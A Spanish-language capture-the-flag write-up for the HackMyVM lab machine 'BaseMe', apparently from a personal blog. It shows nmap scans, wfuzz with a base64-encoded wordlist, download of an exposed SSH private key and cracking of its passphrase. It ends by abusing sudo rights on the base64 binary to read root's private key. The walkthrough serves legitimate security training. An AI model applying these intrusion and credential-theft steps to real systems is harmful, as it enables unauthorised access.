---
layout: single
title: BaseMe - HackMyVM
excerpt: "BaseMe es una máquina Linux creada por sML, en esta máquina veremos Base64 por todas partes :). Nos crearemos un script en bash para codificar un
 diccionario en texto plano a base64, de esta forma encontraremos un directorio que contiene un archivo id_rsa con un passphrase que tendremos escondido en el
 código fuente de la web. Elevaremos privilegios usando el binario base64."
date: 2021-09-23
classes: wide
header:
  teaser: /assets/images/hmvm-Baseme/hmvmBaseme.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - fácil
tags:
  - hackmyvm
  - base64
  - script
  - sML
---

### Escaneo de puertos
```bash
❯ nmap -p- --open -T5 -v -n 192.168.1.51

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Escaneo de servicios
```bash
❯ nmap -sC -sV -p 22,80 192.168.1.51

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 (RSA)
|   256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 (ECDSA)
|_  256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Curl puerto (80)
Lanzo curl al servicio web y veo una cadena en base64.
```bash
❯ curl -s http://192.168.1.51
QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK
```

En el código fuente podemos ver lo siguiente:

![](/assets/images/hmvm-Baseme/stringsComentario.png)

Decodifico la cadena de texto encontrada usando mi maravillosa terminal.
```bash
❯ echo 'QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK' | base64 -d
```

Nos muestra el siguiente mensaje:
> ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas

Aquí lanzé unos cuantos escaneos de directorios con wfuzz con varios diccionarios pero ninguno encontró nada porque necesitamos un diccionario en base64, porque en base64? porque lo dice el texto que hemos decodificado:
> ALL, absolutely ALL that you need is in BASE64.

### Creando script
Para crearnos un diccionario en base64 me hice este sencillo script.

```bash
#!/bin/bash
for i in $(cat common.txt);
    do echo $i | base64 >> common64.txt;
done
```

Lanzo el script para crear el diccionario en base64 usando el diccionario common.txt
```bash
❯ ./TextTo64.sh
❯ ls -la
.rwxr-xr-x noname noname  86 B  Thu Sep 23 17:16:36 2021  TextTo64.sh
.rw-r--r-- noname noname 6.4 KB Thu Sep 23 17:20:46 2021  common.txt
.rw-r--r-- noname noname  11 KB Thu Sep 23 17:21:17 2021  common64.txt
```

### Wfuzz
Wfuzz encuentra `aWRfcnNhCg==`y`cm9ib3RzLnR4dAo=`
```bash
❯ wfuzz -c -t 10 --hc=404 -w common64.txt http://192.168.1.51/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.51/FUZZ
Total requests: 4690

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                  
=====================================================================

000002129:   200        33 L     33 W       2537 Ch     "aWRfcnNhCg=="                                                           
000003550:   200        1 L      1 W        25 Ch       "cm9ib3RzLnR4dAo="
```

Decodificamos las cadenas para ver de que se trata.
```bash
❯ echo 'aWRfcnNhCg==' | base64 -d
id_rsa
❯ echo 'cm9ib3RzLnR4dAo=' | base64 -d
robots.txt
```

Lanzo curl al archivo `robots.txt` para ver su contenido
```bash
❯ curl -s http://192.168.1.51/cm9ib3RzLnR4dAo=
Tm90aGluZyBoZXJlIDooCg==
```
Obtenemos otra cadena en base64 pero no contiene nada
```bash
❯ echo 'Tm90aGluZyBoZXJlIDooCg==' | base64 -d
Nothing here :(
```

Con firefox voy a `http://192.168.1.51/aWRfcnNhCg==` y automáticamente se abre una ventana para descargar el archivo.

![](/assets/images/hmvm-Baseme/id_rsa.png)

Si intentamos usar el `id_rsa` nos dará error porque esta codificado en base64, antes tenemos que decodificarlo, veamos el `id_rsa` codificado:

![](/assets/images/hmvm-Baseme/id_rsaCodificado.png)

id_rsa decodificado

![](/assets/images/hmvm-Baseme/id_rsaDecodificado.png)

Creo un nuevo archivo llamado `id_rsa` con el código decodificado, le doy permisos con chmod 600 e intento acceder por SSH.

```bash
❯ ssh -i id_rsa lucas@192.168.1.51
The authenticity of host '192.168.1.51 (192.168.1.51)' can't be established.
ECDSA key fingerprint is SHA256:Hlyr217g0zTkGOpiqimkeklOhJ4kYRLtHyEh0IgMEbM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.51' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```
No puedo conectarme porque me pide passhprase, creo un diccionario con las palabras que vimos en el código fuente de la web:

![](/assets/images/hmvm-Baseme/nombres.png)

Lanzamos RSAcrack para encontrar el passphrase pero no encuentra nada

![](/assets/images/hmvm-Baseme/failCrackid_rsa.png)

Modificaremos el script TextTo64.sh para pasar las palabras a base64.
```bash
#!/bin/bash
for i in $(cat palabras.txt);
    do echo $i | base64 >> palabras64.txt;
done
```

Palabras codificadas a base64.

![](/assets/images/hmvm-Baseme/palabras64.png)

Ya tengo el passphrase y ya puedo conectarme.
```bash
❯ ssh -i id_rsa lucas@192.168.1.51
Enter passphrase for key 'id_rsa': 
Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 28 12:51:36 2020 from 192.168.1.58
lucas@baseme:~$
```

Obtengo la flag user.
```bash
lucas@baseme:~$ cat user.txt 
HMVXXXXXXAJA
```

### Privesc
Busco todos los comandos que puede ejecutar sudo.
```bash
lucas@baseme:~$ sudo -l
Matching Defaults entries for lucas on baseme:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucas may run the following commands on baseme:
    (ALL) NOPASSWD: /usr/bin/base64
```

Lucas puede ejecutar el binario base64 como root sin usar la contraseña, consultaremos gtfobins.
![](/assets/images/hmvm-Baseme/HackMyVM/4_Baseme/gtfobins.png)

Aquí tenemos 2 opciones para obtener la flag de root, una es apuntar a la flag de root `/root/root.txt`o apuntar al archivo `id_rsa` de root, como quiero hacer las cosas bien apuntaré al `id_rsa` de root ;)

![](/assets/images/hmvm-Baseme/root_id_rsa.png)

Creo un nuevo archivo en mi máquina id_rsa2 y copio el contenido que he obtenido anteriormente, le doy permisos chmod 600 y me conecto de nuevo por SSH

![](/assets/images/hmvm-Baseme/rootssh.png)

Una vez como root ya puedo leer la flag de root

```bash
root@baseme:~# cat root.txt                                                         
HMVXXXX64
```
